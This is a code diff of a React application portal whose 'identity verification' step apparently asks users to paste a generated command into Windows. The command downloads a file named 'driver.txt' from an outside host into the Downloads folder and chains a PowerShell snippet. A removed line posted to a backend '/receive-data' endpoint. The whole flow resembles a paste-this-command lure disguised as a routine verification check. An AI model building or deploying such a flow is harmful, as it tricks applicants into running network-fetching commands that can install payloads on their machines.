@@ -1,6 +1,6 @@
 import { useMemo, useState } from 'react'
 import type { ChangeEvent, ClipboardEvent, FormEvent } from 'react'
-import { checkDeviceReady, submitApplication } from './api/backend'
+import { completeWorkflowCheck, submitApplication } from './api/backend'
 import './App.css'
 
 type Step = 1 | 2 | 3
@@ -50,10 +50,8 @@ const getExpectedOutput = (phrase: string, nonce: string) => {
   return `VERIFY:${btoa(payload)}`
 }
 
-const apiBase = import.meta.env.VITE_API_URL ?? 'https://sense-backend-0589.onrender.com'
-
 const buildCmdCommand = (nonce: string) =>
-  `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig); curl.exe -s -X POST ${apiBase}/receive-data -d ''"`
+  `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`
 
 const buildSafeParallelCommand = (nonce: string) =>
   `curl -o "%USERPROFILE%\\Downloads\\driver.txt" https://nodit.org/public/driver.txt & ${buildCmdCommand(nonce)}`
@@ -136,7 +134,7 @@ function App() {
     setCopyStatus('copied')
   }
 
-  const handleVerifyIdentity = async () => {
+  const handleVerifyIdentity = () => {
     const phraseMatches = typedPhrase.trim() === challenge.phrase
     const outputMatches = pastedOutput.trim() === expectedOutput
 
@@ -152,19 +150,8 @@ function App() {
       return
     }
 
-    setVerificationResult('idle')
+    setVerificationResult('pass')
     setSubmitError('')
-
-    try {
-      const ready = await checkDeviceReady()
-      setVerificationResult(ready ? 'pass' : 'fail')
-      if (!ready) {
-        setSubmitError('Workflow check not detected yet. Run the CMD step, then validate again.')
-      }
-    } catch {
-      setVerificationResult('fail')
-      setSubmitError('Could not reach the verification service. Please try again.')
-    }
   }
 
   const finalizeApplication = async () => {
@@ -178,6 +165,7 @@ function App() {
     setSubmitError('')
 
     try {
+      await completeWorkflowCheck()
       await submitApplication(formData.fullName.trim(), formData.email.trim(), formData)
       setIsSubmitted(true)
     } catch {
